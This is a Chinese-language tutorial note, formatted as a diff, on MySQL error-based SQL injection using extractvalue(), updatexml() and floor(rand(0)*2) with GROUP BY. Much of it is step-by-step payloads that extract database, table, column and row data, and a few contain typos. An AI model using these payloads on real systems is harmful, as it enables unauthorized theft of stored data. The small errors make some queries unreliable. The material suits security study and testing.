@@ -1,0 +1,106 @@
+报错注入
+报错注入在没法用union联合查询时用，但前提还是不能过滤一些关键的函数。
+
+报错注入就是利用了数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。这里主要记录一下xpath语法错误和concat+rand()+group_by()导致主键重复
+
+
+
+xpath语法错误
+利用xpath语法错误来进行报错注入主要利用extractvalue和updatexml两个函数。
+使用条件：mysql版本>5.1.5
+
+
+extractvalue函数
+函数原型：extractvalue(xml_document,Xpath_string)
+正常语法：extractvalue(xml_document,Xpath_string);
+第一个参数：xml_document是string格式，为xml文档对象的名称
+第二个参数：Xpath_string是xpath格式的字符串
+作用：从目标xml中返回包含所查询值的字符串
+
+第二个参数是要求符合xpath语法的字符串，如果不满足要求，则会报错，并且将查询结果放在报错信息里，因此可以利用。
+
+pyload：id='and(select extractvalue("anything",concat('~',(select语句))))
+
+例如：
+
+id='and(select extractvalue(1,concat('~',(select database()))))
+id='and(select extractvalue(1,concat(0x7e,@@version)))
+
+针对mysql数据库：
+
+查数据库名：id='and(select extractvalue(1,concat(0x7e,(select database()))))
+爆表名：id='and(select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))))
+爆字段名：id='and(select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name="TABLE_NAME"))))
+爆数据：id='and(select extractvalue(1,concat(0x7e,(select group_concat(COIUMN_NAME) from TABLE_NAME))))
+
+注：
+
+ ① 0x7e=’~’
+ ② concat(‘a’,‘b’)=“ab”
+ ③ version()=@@version
+ ④ ‘~‘可以换成’#’、’$'等不满足xpath格式的字符
+ ⑤ extractvalue()能查询字符串的最大长度为32，如果我们想要的结果超过32，就要用substring()函数截取或limit分页，一次查看最多32位
+
+updatexml
+函数原型：updatexml(xml_document,xpath_string,new_value)
+正常语法：updatexml(xml_document,xpath_string,new_value)
+第一个参数：xml_document是string格式，为xml文档对象的名称 第二个参数：xpath_string是xpath格式的字符串
+第三个参数：new_value是string格式，替换查找到的负荷条件的数据 作用：改变文档中符合条件的节点的值
+
+第二个参数跟extractvalue函数的第二个参数一样，因此也可以利用，且利用方式相同
+payload：id='and(select updatexml("anything",concat('~',(select语句())),"anything"))
+
+例如：
+
+'and(select updatexml(1,concat('~',(select database())),1))
+'and(select updatexml(1,concat(0x7e,@@database),1))
+
+同样，针对mysql：
+
+爆数据库名：'and(select updatexml(1,concat(0x7e,(select database())),0x7e))
+爆表名：'and(select updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database())),0x7e))
+爆列名：'and(select updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name="TABLE_NAME")),0x7e))
+爆数据：'and(select updatexml(1,concat(0x7e,(select group_concat(COLUMN_NAME)from TABLE_NAME)),0x7e))
+
+
+
+concat+rand()+group_by()导致主键重复
+这种报错方法的本质是因为floor(rand(0)*2)的重复性，导致group by语句出错。group by key的原理是循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，如果key存在于临时表中，则不在临时表中更新临时表的数据；如果key不在临时表中，则在临时表中插入key所在行的数据。
+
+rand()：
+
+生成0~1之间的随机数，可以给定一个随机数的种子，对于每一个给定的种子，rand()函数都会产生一系列可以复现的数字
+
+floor()：
+
+对任意正或者负的十进制值向下取整
+
+通常利用这两个函数的方法是floor(rand(0))*2 ,其会生成0和1两个数
+
+group by
+
+group by是根据一个或多个列对结果集进行分组的sql语句，其用法为：
+SELECT column_name, aggregate_function(column_name)
+FROM table_name
+WHERE column_name operator value
+GROUP BY column_name
+
+常见的payload为：
+
+'union select 1 from (select count(*),concat((slelect语句),floor(rand(0)*2))x from "一个足大的表" group by x)a--+
+例如：
+'union select 1 from (select count(*),concat((select user()),floor(rand(0)*2))x from information_schema.tables group by x)a--+
+利用information_schema.tables表，相似的还可以用information_schema.columns等
+
+为了使结构能够更方便的查看，可以在concat()中添加一些内容
+
+'union select 1 from (select count(*),concat((select user())," ",floor(rand(0)*2))x from information_schema.tables group by x)a
+
+之后还是将select语句改为一般的注入语句就可以：
+
+爆数据库名：'union select 1 from (select count(*),concat((select database())," ",floor(rand(0)*2))x from information_schema.tables group by x)a
+爆表名：'union select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 0,1) ," ",floor(rand(0)*2))x from information_schema.tables group by x)a
+爆列名：'union select 1 from (select count(*),concat((select column_name from information_schema.columns where table_name="TABLE_NAME" limit 0,1) ," ",floor(rand(0)*2))x from information_schema.tables group by x)a
+爆数据：'union select 1 from (select count(*),concat((select COLUMN_NAME from TABLE_NAME limit 0,1) ," ",floor(rand(0)*2))x from information_schema.tables group by x)a
+
+不能使用group_concat函数，所以用limit语句来限制查询结果的列数
